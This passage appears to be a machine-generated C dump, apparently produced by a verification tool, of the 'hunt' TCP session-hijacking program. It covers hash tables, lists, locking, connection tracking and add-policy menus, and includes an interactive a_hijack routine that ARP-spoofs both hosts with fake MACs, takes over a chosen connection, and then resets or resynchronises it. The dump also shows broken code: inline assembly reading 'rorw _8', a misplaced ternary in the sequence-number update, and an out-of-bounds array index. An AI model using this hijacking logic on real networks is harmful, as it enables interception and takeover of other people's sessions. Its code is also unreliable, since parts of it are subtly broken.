  return (unsigned int)return_value___builtin_bswap32_1_link4;
}

// __bswap_32_link5
// file /usr/include/x86_64-linux-gnu/bits/byteswap.h line 45
static inline unsigned int __bswap_32_link5(unsigned int __bsx_link5)
{
  signed long int return_value___builtin_bswap32_1_link5;
  return_value___builtin_bswap32_1_link5=__builtin_bswap32((signed long int)__bsx_link5);
  return (unsigned int)return_value___builtin_bswap32_1_link5;
}

// __bswap_32_link6
// file /usr/include/x86_64-linux-gnu/bits/byteswap.h line 45
static inline unsigned int __bswap_32_link6(unsigned int __bsx_link6)
{
  signed long int return_value___builtin_bswap32_1_link6;
  return_value___builtin_bswap32_1_link6=__builtin_bswap32((signed long int)__bsx_link6);
  return (unsigned int)return_value___builtin_bswap32_1_link6;
}

// __bswap_32_link7
// file /usr/include/x86_64-linux-gnu/bits/byteswap.h line 45
static inline unsigned int __bswap_32_link7(unsigned int __bsx_link7)
{
  signed long int return_value___builtin_bswap32_1_link7;
  return_value___builtin_bswap32_1_link7=__builtin_bswap32((signed long int)__bsx_link7);
  return (unsigned int)return_value___builtin_bswap32_1_link7;
}

// __chose_table_size
// file c/hash.c line 16
static signed int __chose_table_size(signed int size)
{
  signed int i;
  static signed int ht_size[44l] = { 37, 47, 79, 97, 163, 197, 331, 397, 673, 797, 1361, 1597, 2729, 3203, 5471, 6421, 10949, 12853, 21911, 25717, 43853, 51437, 87719, 102877, 175447, 205759, 350899, 411527, 701819, 823117, 1403641, 1646237, 2807303, 3292489, 5614657, 6584983, 11229331, 13169977, 22458671, 26339969, 44917381, 52679969, 89834777, 105359939 };
  if(size >= ht_size[43l])
    return ht_size[(signed long int)(sizeof(signed int [44l]) /*176ul*/  / sizeof(signed int) /*4ul*/ )];

  else
  {
    i = 0;
    for( ; !(ht_size[(signed long int)i] >= size); i = i + 1)
      ;
    return ht_size[(signed long int)i];
  }
}

// __conn_add
// file hunt.c line 305
static void __conn_add(struct packet *p, unsigned int key)
{
  struct iphdr *iph = p->p_iph;
  struct tcphdr *tcph = p->p_hdr.p_tcph;
  struct conn_info *ci;
  struct host_info *h_src;
  struct host_info *h_dst;
  void *return_value_malloc_1;
  return_value_malloc_1=malloc(sizeof(struct conn_info) /*160ul*/ );
  ci = (struct conn_info *)return_value_malloc_1;
  /* assertion ci */
  assert(ci != ((struct conn_info *)NULL));
  memset((void *)ci, 0, sizeof(struct conn_info) /*160ul*/ );
  ci->use_count = 1;
  pthread_mutex_init(&ci->mutex, (const union anonymous_9 *)(void *)0);
  unsigned short int tmp_statement_expression_2;
  unsigned short int __conn_add__1__1____v;
  unsigned short int __x = (unsigned short int)tcph->_anon0._anon1.dest;
  asm("rorw _8, %w0" : "=r"(__conn_add__1__1____v) : "0"(__x) : "cc");
  tmp_statement_expression_2 = __conn_add__1__1____v;
  _Bool tmp_if_expr_4;
  unsigned short int tmp_statement_expression_3;
  if((signed int)tmp_statement_expression_2 >= 1024)
  {
    unsigned short int __v;
    unsigned short int __conn_add__1__2____x = (unsigned short int)tcph->_anon0._anon1.source;
    asm("rorw _8, %w0" : "=r"(__v) : "0"(__conn_add__1__2____x) : "cc");
    tmp_statement_expression_3 = __v;
    tmp_if_expr_4 = (signed int)tmp_statement_expression_3 < 1024 ? (_Bool)1 : (_Bool)0;
  }

  else
    tmp_if_expr_4 = (_Bool)0;
  if(tmp_if_expr_4)
  {
    ci->src_addr = (unsigned long int)iph->daddr;
    ci->dst_addr = (unsigned long int)iph->saddr;
    ci->src_port = tcph->_anon0._anon1.dest;
    ci->dst_port = tcph->_anon0._anon1.source;
    h_src = &ci->dst;
    h_dst = &ci->src;
  }

  else
  {
    ci->src_addr = (unsigned long int)iph->saddr;
    ci->dst_addr = (unsigned long int)iph->daddr;
    ci->src_port = tcph->_anon0._anon1.source;
    ci->dst_port = tcph->_anon0._anon1.dest;
    h_src = &ci->src;
    h_dst = &ci->dst;
  }
  unsigned int return_value___bswap_32_5;
  return_value___bswap_32_5=__bswap_32(tcph->_anon0._anon1.seq);
  unsigned int return_value___bswap_32_6;
  return_value___bswap_32_6=__bswap_32((unsigned int)(return_value___bswap_32_5 + (unsigned int)p->p_data_len + (unsigned int)tcph->_anon0._anon1.syn != 0u ? 1 : 0));
  h_src->next_seq = (unsigned long int)return_value___bswap_32_6;
  if(!(tcph->_anon0._anon1.ack == 0))
    h_src->next_d_seq = (unsigned long int)tcph->_anon0._anon1.ack_seq;

  h_src->window = tcph->_anon0._anon1.window;
  h_src->id = iph->id;
  memcpy((void *)h_src->dst_mac, (const void *)p->p_ethh->h_dest, (unsigned long int)6);
  memcpy((void *)h_src->src_mac, (const void *)p->p_ethh->h_source, (unsigned long int)6);
  h_dst->next_seq = h_src->next_d_seq;
  h_dst->next_d_seq = h_src->next_seq;
  h_dst->window = tcph->_anon0._anon1.window;
  h_dst->id = iph->id;
  memcpy((void *)h_dst->dst_mac, (const void *)h_src->src_mac, (unsigned long int)6);
  memcpy((void *)h_dst->src_mac, (const void *)h_src->dst_mac, (unsigned long int)6);
  hash_put(&conn_table, key, (void *)ci);
  print_new_conn_ind(1);
}

// __enqueue
// file c/list.c line 78
static inline void __enqueue(struct list *l, void *m)
{
  *((void **)((char *)m + (signed long int)l->l_off)) = (void *)0;
  if(!(l->l_last == NULL))
    *((void **)((char *)l->l_last + (signed long int)l->l_off)) = m;

  else
    l->l_first = m;
  l->l_last = m;
}

// __func_remove
// file c/list.c line 242
static inline signed int __func_remove(signed int nr, void *p, void *m)
{
  if(p == m)
    return 1;

  else
    return 0;
}

// __func_remove_at
// file c/list.c line 250
static inline signed int __func_remove_at(signed int nr, void *p, void *m)
{
  if(nr == (signed int)m)
    return 1;

  else
    return 0;
}

// __hash_find
// file c/hash.c line 131
static signed int __hash_find(struct hash *h, unsigned int key, void *arg)
{
  signed int retval;
  signed int hv;
  struct hash_table_item *h_table;
  hv=__hv(key, (unsigned int)h->h_max_items);
  h_table = h->h_table;
  retval = -1;
  _Bool tmp_if_expr_2;
  signed int return_value___hv_peek_next_1;
  while(!((h_table + (signed long int)hv)->ht_data == NULL))
  {
    if((h_table + (signed long int)hv)->ht_key == key)
    {
      if(h->h_eqfunc == ((signed int (*)(unsigned int, void *, void *))NULL))
        tmp_if_expr_2 = (_Bool)1;

      else
      {
        return_value___hv_peek_next_1=__hv_peek_next();
        tmp_if_expr_2 = (h_table + (signed long int)return_value___hv_peek_next_1)->ht_data == (void *)0 ? (_Bool)1 : (_Bool)0;
      }
      if(tmp_if_expr_2)
      {
        retval = hv;
        break;
      }

      else
      {
        signed int return_value;
        return_value=h->h_eqfunc(key, (h_table + (signed long int)hv)->ht_data, arg);
        if(!(return_value == 0))
        {
          retval = hv;
          break;
        }

      }
    }

    hv=__hv_next();
  }
  return retval;
}

// __hash_need_space
// file c/hash.c line 40
static inline signed int __hash_need_space(struct hash *h)
{
  return h->h_items >= h->h_space_after ? 1 : 0;
}

// __hash_new_space
// file c/hash.c line 222
static void __hash_new_space(struct hash *h)
{
  struct hash_table_item *old_h_table;
  signed int old_items;
  signed int old_max_items;
  signed int i;
  old_items = h->h_items;
  old_max_items = h->h_max_items;
  old_h_table = h->h_table;
  h->h_max_items=__chose_table_size(h->h_max_items + (100 * h->h_max_items) / 100);
  void *return_value_malloc_1;
  return_value_malloc_1=malloc((unsigned long int)h->h_max_items * sizeof(struct hash_table_item) /*16ul*/ );
  h->h_table = (struct hash_table_item *)return_value_malloc_1;
  if(h->h_table == ((struct hash_table_item *)NULL))
  {
    h->h_items = old_items;
    h->h_max_items = old_max_items;
    h->h_table = old_h_table;
  }

  else
  {
    h->h_space_after=__when_need_space(h->h_max_items);
    memset((void *)h->h_table, 0, (unsigned long int)h->h_max_items * sizeof(struct hash_table_item) /*16ul*/ );
    h->h_items = 0;
    i = 0;
    for( ; !(i >= old_max_items); i = i + 1)
      if(!((old_h_table + (signed long int)i)->ht_data == NULL))
        __hash_put(h, (old_h_table + (signed long int)i)->ht_key, (old_h_table + (signed long int)i)->ht_data);

    free((void *)old_h_table);
  }
}

// __hash_put
// file c/hash.c line 159
static void __hash_put(struct hash *h, unsigned int key, void *data)
{
  signed int hv;
  struct hash_table_item *h_table;
  hv=__hv(key, (unsigned int)h->h_max_items);
  h_table = h->h_table;
  while(!((h_table + (signed long int)hv)->ht_data == NULL))
    hv=__hv_next();
  (h_table + (signed long int)hv)->ht_key = key;
  (h_table + (signed long int)hv)->ht_data = data;
  h->h_items = h->h_items + 1;
}

// __hash_put_check
// file c/hash.c line 175
static signed int __hash_put_check(struct hash *h, unsigned int key, void *data, void *arg)
{
  signed int retval;
  signed int hv;
  struct hash_table_item *h_table = h->h_table;
  retval=__hash_find(h, key, arg);
  if(!(retval >= 0))
  {
    hv=__hv_peek();
    (h_table + (signed long int)hv)->ht_key = key;
    (h_table + (signed long int)hv)->ht_data = data;
    return 0;
  }

  else
    return -1;
}

// __hash_remap
// file c/hash.c line 192
static void __hash_remap(struct hash *h, signed int hv)
{
  signed int count;
  signed int i;
  struct hash_table_item *h_table;
  struct hash_table_item *ht_save;
  __hv_save_position();
  h_table = h->h_table;
  count = 0;
  while(!((h_table + (signed long int)hv)->ht_data == NULL))
  {
    count = count + 1;
    hv=__hv_next();
  }
  if(!(count == 0))
  {
    void *return_value___builtin_alloca_1;
    return_value___builtin_alloca_1=__builtin_alloca((unsigned long int)count * sizeof(struct hash_table_item) /*16ul*/ );
    ht_save = (struct hash_table_item *)return_value___builtin_alloca_1;
    hv=__hv_load_position();
    i = 0;
    while(!((h_table + (signed long int)hv)->ht_data == NULL))
    {
      (ht_save + (signed long int)i)->ht_key = (h_table + (signed long int)hv)->ht_key;
      (ht_save + (signed long int)i)->ht_data = (h_table + (signed long int)hv)->ht_data;
      (h_table + (signed long int)hv)->ht_key = (unsigned int)0;
      (h_table + (signed long int)hv)->ht_data = (void *)0;
      i = i + 1;
      hv=__hv_next();
    }
    h->h_items = h->h_items - count;
    i = 0;
    for( ; !(i >= count); i = i + 1)
      __hash_put(h, (ht_save + (signed long int)i)->ht_key, (ht_save + (signed long int)i)->ht_data);
  }

}

// __hv
// file c/hash.c line 80
static inline signed int __hv(unsigned int key, unsigned int max_items)
{
  __hv_max_items = max_items;
  __hv_hash = key % max_items;
  return (signed int)__hv_hash;
}

// __hv_load_position
// file c/hash.c line 122
static inline signed int __hv_load_position(void)
{
  __hv_hash = __hv_hash_save;
  return (signed int)__hv_hash;
}

// __hv_next
// file c/hash.c line 94
static inline signed int __hv_next(void)
{
  __hv_hash = (__hv_hash + (unsigned int)1) % __hv_max_items;
  return (signed int)__hv_hash;
}

// __hv_peek
// file c/hash.c line 89
static inline signed int __hv_peek(void)
{
  return (signed int)__hv_hash;
}

// __hv_peek_next
// file c/hash.c line 105
static inline signed int __hv_peek_next(void)
{
  return (signed int)((__hv_hash + (unsigned int)1) % __hv_max_items);
}

// __hv_save_position
// file c/hash.c line 114
static inline void __hv_save_position(void)
{
  __hv_hash_save = __hv_hash;
}

// __list_consume
// file c/list.c line 162
static void * __list_consume(struct list *l, struct timespec *absts)
{
  void *retval;
  signed int ret;
  struct timespec ts;
  __lock(l);
  while(l->l_first == NULL)
  {
    if(!(l->l_produce_done == 0))
      break;

    if(!(absts == ((struct timespec *)NULL)))
    {
      ret=pthread_cond_timedwait(&l->l_notempty, &l->l_mutex, absts);
      if(ret == 4 || ret == 110)
        break;

    }

    else
    {
      ts.tv_sec = (signed long int)2000000000;
      ts.tv_nsec = (signed long int)0;
      ret=pthread_cond_timedwait(&l->l_notempty, &l->l_mutex, &ts);
      if(ret == 4 || ret == 110)
        break;

    }
  }
  retval=__pop(l);
  __unlock(l);
  return retval;
}

// __list_remove
// file c/list.c line 258
static inline void * __list_remove(struct list *l, signed int (*func)(signed int, void *, void *), void *m)
{
  void *retval;
  void **p;
  signed int nr = 0;
  __lock(l);
  p = &l->l_first;
  if(!(*p == NULL))
  {
    signed int return_value;
    return_value=func(nr, *p, m);
    if(!(return_value == 0))
    {
      retval = *p;
      *p = *((void **)((char *)*p + (signed long int)l->l_off));
      if(*p == NULL)
      {
        if(l->l_first == NULL)
          l->l_last = (void *)0;

        else
          l->l_last = (void *)((char *)p - (signed long int)l->l_off);
      }

      __update_iterators(l, retval, *p);
      __unlock(l);
      return retval;
    }

    p = &(*((void **)((char *)*p + (signed long int)l->l_off)));
    nr = nr + 1;
  }

  __unlock(l);
  return *p;
}

// __lock
// file c/list.c line 30
static inline void __lock(struct list *l)
{
  _Bool tmp_if_expr_2;
  unsigned long int return_value_pthread_self_1;
  if(l->l_locked == 0)
    tmp_if_expr_2 = (_Bool)1;

  else
  {
    return_value_pthread_self_1=pthread_self();
    tmp_if_expr_2 = l->l_locked_thr != return_value_pthread_self_1 ? (_Bool)1 : (_Bool)0;
  }
  if(tmp_if_expr_2)
    pthread_mutex_lock(&l->l_mutex);

}

// __lock_link1
// file c/hash.c line 251
static inline void __lock_link1(struct hash *h)
{
  _Bool tmp_if_expr_2_link1;
  unsigned long int return_value_pthread_self_1_link1;
  if(h->h_locked == 0)
    tmp_if_expr_2_link1 = (_Bool)1;

  else
  {
    return_value_pthread_self_1_link1=pthread_self();
    tmp_if_expr_2_link1 = h->h_locked_thr != return_value_pthread_self_1_link1 ? (_Bool)1 : (_Bool)0;
  }
  if(tmp_if_expr_2_link1)
    pthread_mutex_lock(&h->h_mutex);

}

// __lock_link2
// file c/array.c line 37
static inline void __lock_link2(struct array *a)
{
  _Bool tmp_if_expr_2_link2;
  unsigned long int return_value_pthread_self_1_link2;
  if(a->a_locked == 0)
    tmp_if_expr_2_link2 = (_Bool)1;

  else
  {
    return_value_pthread_self_1_link2=pthread_self();
    tmp_if_expr_2_link2 = a->a_locked_thr != return_value_pthread_self_1_link2 ? (_Bool)1 : (_Bool)0;
  }
  if(tmp_if_expr_2_link2)
    pthread_mutex_lock(&a->a_mutex);

}

// __pop
// file c/list.c line 140
static inline void * __pop(struct list *l)
{
  void *retval = l->l_first;
  if(!(retval == NULL))
  {
    l->l_first = *((void **)((char *)retval + (signed long int)l->l_off));
    if(l->l_first == NULL)
      l->l_last = (void *)0;

    __update_iterators(l, retval, l->l_first);
  }

  return retval;
}

// __register
// file timer.c line 25
static signed int __register(struct timejob *tj)
{
  struct list_iterator li;
  signed int i;
  signed int retval;
  signed int insert_it;
  struct timejob *p;
  retval = 0;
  insert_it = 0;
  i = 0;
  list_iter_set(&li, &timejob_list);
  void *return_value_list_iter_get_1;
  _Bool tmp_if_expr_3;
  _Bool tmp_if_expr_2;
  do
  {
    return_value_list_iter_get_1=list_iter_get(&li);
    p = (struct timejob *)return_value_list_iter_get_1;
    if(p == ((struct timejob *)NULL))
      break;

    if(!(tj->j_ts.tv_sec >= p->j_ts.tv_sec))
      tmp_if_expr_3 = (_Bool)1;

    else
    {
      if(p->j_ts.tv_sec == tj->j_ts.tv_sec)
        tmp_if_expr_2 = p->j_ts.tv_nsec > tj->j_ts.tv_nsec ? (_Bool)1 : (_Bool)0;

      else
        tmp_if_expr_2 = (_Bool)0;
      tmp_if_expr_3 = tmp_if_expr_2 ? (_Bool)1 : (_Bool)0;
    }
    if(tmp_if_expr_3)
    {
      insert_it = 1;
      break;
    }

    i = i + 1;
  }
  while((_Bool)1);
  list_iter_end(&li);
  if(!(insert_it == 0))
  {
    list_insert_at(&timejob_list, i, (void *)tj);
    if(i == 0)
      retval = 1;

  }

  else
  {
    list_enqueue(&timejob_list, (void *)tj);
    signed int return_value_list_count_4;
    return_value_list_count_4=list_count(&timejob_list);
    if(return_value_list_count_4 == 1)
      retval = 1;

  }
  return retval;
}

// __unlock
// file c/list.c line 38
static inline void __unlock(struct list *l)
{
  _Bool tmp_if_expr_2;
  unsigned long int return_value_pthread_self_1;
  if(l->l_locked == 0)
    tmp_if_expr_2 = (_Bool)1;

  else
  {
    return_value_pthread_self_1=pthread_self();
    tmp_if_expr_2 = l->l_locked_thr != return_value_pthread_self_1 ? (_Bool)1 : (_Bool)0;
  }
  if(tmp_if_expr_2)
    pthread_mutex_unlock(&l->l_mutex);

}

// __unlock_link1
// file c/hash.c line 259
static inline void __unlock_link1(struct hash *h)
{
  _Bool tmp_if_expr_2_link1;
  unsigned long int return_value_pthread_self_1_link1;
  if(h->h_locked == 0)
    tmp_if_expr_2_link1 = (_Bool)1;

  else
  {
    return_value_pthread_self_1_link1=pthread_self();
    tmp_if_expr_2_link1 = h->h_locked_thr != return_value_pthread_self_1_link1 ? (_Bool)1 : (_Bool)0;
  }
  if(tmp_if_expr_2_link1)
    pthread_mutex_unlock(&h->h_mutex);

}

// __unlock_link2
// file c/array.c line 45
static inline void __unlock_link2(struct array *a)
{
  _Bool tmp_if_expr_2_link2;
  unsigned long int return_value_pthread_self_1_link2;
  if(a->a_locked == 0)
    tmp_if_expr_2_link2 = (_Bool)1;

  else
  {
    return_value_pthread_self_1_link2=pthread_self();
    tmp_if_expr_2_link2 = a->a_locked_thr != return_value_pthread_self_1_link2 ? (_Bool)1 : (_Bool)0;
  }
  if(tmp_if_expr_2_link2)
    pthread_mutex_unlock(&a->a_mutex);

}

// __update_iterators
// file c/list.c line 58
static inline void __update_iterators(struct list *l, void *old_item, void *new_item)
{
  struct list_iterator *i = l->l_iter;
  for( ; !(i == ((struct list_iterator *)NULL)); i = i->i_next)
    if(i->i_cur == old_item)
      i->i_cur = new_item;

}

// __when_need_space
// file c/hash.c line 35
static inline signed int __when_need_space(signed int max_items)
{
  return (80 * max_items) / 100;
}

// a_hijack
// file main.c line 278
void a_hijack(void)
{
  unsigned char __src_fake_mac[6l] = { (unsigned char)0xEA, (unsigned char)0x1A, (unsigned char)0xDE, (unsigned char)0xAD, (unsigned char)0xBE, (unsigned char)0xEF };
  unsigned char __dst_fake_mac[6l] = { (unsigned char)0xEA, (unsigned char)0x1A, (unsigned char)0xDE, (unsigned char)0xAD, (unsigned char)0xBE, (unsigned char)0xEE };
  unsigned char *src_fake_mac = (unsigned char *)(void *)0;
  unsigned char *dst_fake_mac = (unsigned char *)(void *)0;
  char buf[512l];
  struct user_conn_info uci;
  signed int retval;
  signed int retval2;
  signed int c;
  signed int input_mode;
  signed int return_value_choose_connection_9;
  return_value_choose_connection_9=choose_connection(&uci);
  _Bool tmp_if_expr_7;
  struct arp_spoof_info *return_value_get_arp_spoof_6;
  unsigned char *return_value_suggest_mac_1;
  signed int return_value_menu_choose_mac_2;
  unsigned char *return_value_suggest_mac_3;
  signed int return_value_menu_choose_mac_4;
  if(return_value_choose_connection_9 == 0)
  {
    struct arp_spoof_info *return_value_get_arp_spoof_5;
    return_value_get_arp_spoof_5=get_arp_spoof((unsigned int)uci.src_addr, (unsigned int)uci.dst_addr);
    if(return_value_get_arp_spoof_5 == ((struct arp_spoof_info *)NULL))
    {
      return_value_get_arp_spoof_6=get_arp_spoof((unsigned int)uci.dst_addr, (unsigned int)uci.src_addr);
      tmp_if_expr_7 = !(return_value_get_arp_spoof_6 != ((struct arp_spoof_info *)NULL)) ? (_Bool)1 : (_Bool)0;
    }

    else
      tmp_if_expr_7 = (_Bool)0;
    if(tmp_if_expr_7)
    {
      c=menu_choose_char("arp spoof src in dst y/n", "yn", (char)121);
      switch(c)
      {
        case 121:
        {
          return_value_suggest_mac_1=suggest_mac();
          sprintf_eth_mac(buf, return_value_suggest_mac_1);
          return_value_menu_choose_mac_2=menu_choose_mac("src MAC", __src_fake_mac, buf);
          if(!(return_value_menu_choose_mac_2 >= 0))
            goto __CPROVER_DUMP_L32;

          src_fake_mac = __src_fake_mac;
          break;
        }
        case 110:
        {
          src_fake_mac = (unsigned char *)(void *)0;
          break;
        }
        default:
          goto __CPROVER_DUMP_L32;
      }
      c=menu_choose_char("arp spoof dst in src y/n", "yn", (char)121);
      switch(c)
      {
        case 121:
        {
          return_value_suggest_mac_3=suggest_mac();
          sprintf_eth_mac(buf, return_value_suggest_mac_3);
          return_value_menu_choose_mac_4=menu_choose_mac("dst MAC", __dst_fake_mac, buf);
          if(!(return_value_menu_choose_mac_4 >= 0))
            goto __CPROVER_DUMP_L32;

          dst_fake_mac = __dst_fake_mac;
          break;
        }
        case 110:
        {
          dst_fake_mac = (unsigned char *)(void *)0;
          break;
        }
        default:
          goto __CPROVER_DUMP_L32;
      }
      if(dst_fake_mac == ((unsigned char *)NULL) && src_fake_mac == ((unsigned char *)NULL))
        printf("Possible ACK storm can ocure because you don't do ARP spoof at all, OK\n");

    }

    else
      printf("hosts already ARP spoofed\n");
    signed int return_value_menu_choose_char_8;
    return_value_menu_choose_char_8=menu_choose_char("input mode [r]aw, [l]ine+echo+\\r, line+[e]cho", "rle", (char)114);
    switch(return_value_menu_choose_char_8)
    {
      case 114:
      {
        input_mode = 0;
        break;
      }
      case 108:
      {
        input_mode = 1;
        break;
      }
      case 101:
      {
        input_mode = 2;
        break;
      }
      default:
        goto __CPROVER_DUMP_L32;
    }
    c=menu_choose_char("dump connectin y/n", "yn", (char)121);
    switch(c)
    {
      case 121:
      {
        dump_connection(&uci);
        break;
      }
      case 110:
      {
        press_key("press key to take over of connection");
        break;
      }
      default:
        goto __CPROVER_DUMP_L32;
    }
    retval=user_arp_hijack(&uci, (char *)src_fake_mac, (char *)dst_fake_mac, input_mode);
    if(!(retval >= 1))
    {
      c=menu_choose_char("\n[r]eset connection/[s]ynchronize/[n]one", "rsn", (char)114);
      switch(c)
      {
        case 114:
        {
          user_rst(&uci, 1, 2);
          break;
        }
        case 115:
        {
          retval2=user_hijack_sync(&uci);
          if(!(retval2 == 0))
          {
            printf("\n");
            c=menu_choose_char("[r]eset connection/[n]one", "rn", (char)114);
            if(c == 114)
              user_rst(&uci, 1, 2);

          }

          else
            printf("\n");
        }
      }
    }

    user_arp_hijack_done((char *)src_fake_mac, (char *)dst_fake_mac);
    printf("done\n");
  }


__CPROVER_DUMP_L32:
  ;
}

// ack_storm_notify
// file hunt.c line 355
static void ack_storm_notify(struct conn_info *ci, struct user_conn_info *uci)
{
  struct timeval tv;
  signed int print_it = 0;
  if(ci->ack_storm_notify_sec == 0u)
  {
    gettimeofday(&tv, (struct timezone *)(void *)0);
    print_it = 1;
  }

  else
  {
    gettimeofday(&tv, (struct timezone *)(void *)0);
    if(tv.tv_sec + -((signed long int)ci->ack_storm_notify_sec) >= 10l)
      print_it = 1;

  }
  if(!(print_it == 0))
  {
    set_tty_color((enum TTY_COLOR)COLOR_BRIGHTRED);
    printf("\nhunt: possible ACK storm: ");
    print_user_conn_info(uci, 1);
    set_tty_color((enum TTY_COLOR)COLOR_LIGHTGRAY);
    ci->ack_storm_notify_sec = (unsigned int)tv.tv_sec;
  }

}

// add_telnet_rlogin_policy
// file hunt.h line 596
void add_telnet_rlogin_policy(void)
{
  struct add_policy_info *api;
  void *return_value_malloc_1;
  return_value_malloc_1=malloc(sizeof(struct add_policy_info) /*160ul*/ );
  api = (struct add_policy_info *)return_value_malloc_1;
  /* assertion api */
  assert(api != ((struct add_policy_info *)NULL));
  memset((void *)api, 0, sizeof(unsigned long int) /*8ul*/ );
  api->src_addr = (unsigned int)0;
  api->src_mask = (unsigned int)0;
  api->dst_addr = (unsigned int)0;
  api->dst_mask = (unsigned int)0;
  api->src_ports[(signed long int)0] = (unsigned int)0;
  unsigned short int tmp_statement_expression_2;
  unsigned short int __v;
  unsigned short int __x = (unsigned short int)23;
  asm("rorw _8, %w0" : "=r"(__v) : "0"(__x) : "cc");
  tmp_statement_expression_2 = __v;
  api->dst_ports[(signed long int)0] = (unsigned int)tmp_statement_expression_2;
  unsigned short int tmp_statement_expression_3;
  unsigned short int add_telnet_rlogin_policy__1__2____v;
  unsigned short int add_telnet_rlogin_policy__1__2____x = (unsigned short int)513;
  asm("rorw _8, %w0" : "=r"(add_telnet_rlogin_policy__1__2____v) : "0"(add_telnet_rlogin_policy__1__2____x) : "cc");
  tmp_statement_expression_3 = add_telnet_rlogin_policy__1__2____v;
  api->dst_ports[(signed long int)1] = (unsigned int)tmp_statement_expression_3;
  api->dst_ports[(signed long int)2] = (unsigned int)0;
  list_push(&l_add_policy, (void *)api);
}

// addpolicy_add_item
// file addpolicy.c line 103
void addpolicy_add_item(void)
{
  struct add_policy_info *api;
  unsigned int src_ip;
  unsigned int dst_ip;
  unsigned int src_mask;
  unsigned int dst_mask;
  signed int src_ports[17l];
  signed int dst_ports[17l];
  signed int nr;
  signed int return_value_menu_choose_host_mask_ports_dfl_1;
  return_value_menu_choose_host_mask_ports_dfl_1=menu_choose_host_mask_ports_dfl("src ip addr/mask ports", &src_ip, &src_mask, (unsigned int *)src_ports, (unsigned int)0, (unsigned int)0, (signed int *)(void *)0);
  if(return_value_menu_choose_host_mask_ports_dfl_1 >= 0)
  {
    signed int return_value_menu_choose_host_mask_ports_dfl_2;
    return_value_menu_choose_host_mask_ports_dfl_2=menu_choose_host_mask_ports_dfl("dst ip addr/mask ports", &dst_ip, &dst_mask, (unsigned int *)dst_ports, (unsigned int)0, (unsigned int)0, (signed int *)(void *)0);
    if(return_value_menu_choose_host_mask_ports_dfl_2 >= 0)
    {
      signed int return_value_list_count_3;
      return_value_list_count_3=list_count(&l_add_policy);
      signed int return_value_list_count_4;
      return_value_list_count_4=list_count(&l_add_policy);
      nr=menu_choose_unr("insert at", 0, return_value_list_count_3, return_value_list_count_4);
      if(!(nr == -1))
      {
        void *return_value_malloc_5;
        return_value_malloc_5=malloc(sizeof(struct add_policy_info) /*160ul*/ );
        api = (struct add_policy_info *)return_value_malloc_5;
        memset((void *)api, 0, sizeof(struct add_policy_info) /*160ul*/ );
        api->src_addr = src_ip;
        api->src_mask = src_mask;
        port_htons((unsigned int *)src_ports);
        memcpy((void *)api->src_ports, (const void *)src_ports, sizeof(signed int) /*4ul*/  * (unsigned long int)(16 + 1));
        api->dst_addr = dst_ip;
        api->dst_mask = dst_mask;
        port_htons((unsigned int *)dst_ports);
        memcpy((void *)api->dst_ports, (const void *)dst_ports, sizeof(signed int) /*4ul*/  * (unsigned long int)(16 + 1));
        list_lock(&l_add_policy);
        list_insert_at(&l_add_policy, nr, (void *)api);
        list_unlock(&l_add_policy);
      }

    }

  }

}

// addpolicy_del_item
// file addpolicy.c line 169
void addpolicy_del_item(void)
{
  signed int i;
  struct add_policy_info *api;
  addpolicy_list_items();
  signed int return_value_list_count_1;
  return_value_list_count_1=list_count(&l_add_policy);
  i=menu_choose_unr("item nr. to delete", 0, return_value_list_count_1 - 1, -1);
  if(i >= 0)
  {
    list_lock(&l_add_policy);
    void *return_value_list_remove_at_2;
    return_value_list_remove_at_2=list_remove_at(&l_add_policy, i);
    api = (struct add_policy_info *)return_value_list_remove_at_2;
    list_unlock(&l_add_policy);
    free((void *)api);
  }

}

// addpolicy_item_print
// file addpolicy.c line 72
static void addpolicy_item_print(signed int i, struct add_policy_info *api)
{
  char buf_src_ports[512l];
  char buf_dst_ports[512l];
  char host_buf[512l];
  sprintf_db_ports(api->src_ports, buf_src_ports, (signed int)sizeof(char [512l]) /*512ul*/ , 1);
  sprintf_db_ports(api->dst_ports, buf_dst_ports, (signed int)sizeof(char [512l]) /*512ul*/ , 1);
  char *return_value_host_lookup_1;
  return_value_host_lookup_1=host_lookup(api->src_addr, hl_mode);
  signed int return_value_count_mask_2;
  return_value_count_mask_2=count_mask(api->src_mask);
  sprintf(host_buf, "%s/%d [%s]", return_value_host_lookup_1, return_value_count_mask_2, (const void *)buf_src_ports);
  char *return_value_host_lookup_3;
  return_value_host_lookup_3=host_lookup(api->dst_addr, hl_mode);
  signed int return_value_count_mask_4;
  return_value_count_mask_4=count_mask(api->dst_mask);
  printf("%2d) %-32s <--> %s/%d [%s]\n", i, (const void *)host_buf, return_value_host_lookup_3, return_value_count_mask_4, (const void *)buf_dst_ports);
}

// addpolicy_list_items
// file addpolicy.c line 87
void addpolicy_list_items(void)
{
  struct list_iterator li;
  struct add_policy_info *api;
  signed int i = 0;
  list_iter_set(&li, &l_add_policy);
  void *return_value_list_iter_get_1;
  signed int tmp_post_2;
  do
  {
    return_value_list_iter_get_1=list_iter_get(&li);
    api = (struct add_policy_info *)return_value_list_iter_get_1;
    if(api == ((struct add_policy_info *)NULL))
      break;

    tmp_post_2 = i;
    i = i + 1;
    addpolicy_item_print(tmp_post_2, api);
    if(i % lines_o == 0)
      lines_o_press_key();

  }
  while((_Bool)1);
  list_iter_end(&li);
}

// addpolicy_mod_item
// file addpolicy.c line 136
void addpolicy_mod_item(void)
{
  struct add_policy_info *api;
  unsigned int src_ip;
  unsigned int dst_ip;
  unsigned int src_mask;
  unsigned int dst_mask;
  signed int src_ports[17l];
  signed int dst_ports[17l];
  signed int nr;
  addpolicy_list_items();
  signed int return_value_list_count_1;
  return_value_list_count_1=list_count(&l_add_policy);
  signed int return_value_list_count_2;
  return_value_list_count_2=list_count(&l_add_policy);
  nr=menu_choose_unr("choose item", 0, return_value_list_count_1 - 1, return_value_list_count_2 - 1);
  if(!(nr == -1))
  {
    void *return_value_list_at_3;
    return_value_list_at_3=list_at(&l_add_policy, nr);
    api = (struct add_policy_info *)return_value_list_at_3;
    if(!(api == ((struct add_policy_info *)NULL)))
    {
      signed int return_value_menu_choose_host_mask_ports_dfl_4;
      return_value_menu_choose_host_mask_ports_dfl_4=menu_choose_host_mask_ports_dfl("src ip addr/mask ports", &src_ip, &src_mask, (unsigned int *)src_ports, api->src_addr, api->src_mask, (signed int *)api->src_ports);
      if(return_value_menu_choose_host_mask_ports_dfl_4 >= 0)
      {
        signed int return_value_menu_choose_host_mask_ports_dfl_5;
        return_value_menu_choose_host_mask_ports_dfl_5=menu_choose_host_mask_ports_dfl("dst ip addr/mask ports", &dst_ip, &dst_mask, (unsigned int *)dst_ports, api->dst_addr, api->dst_mask, (signed int *)api->dst_ports);
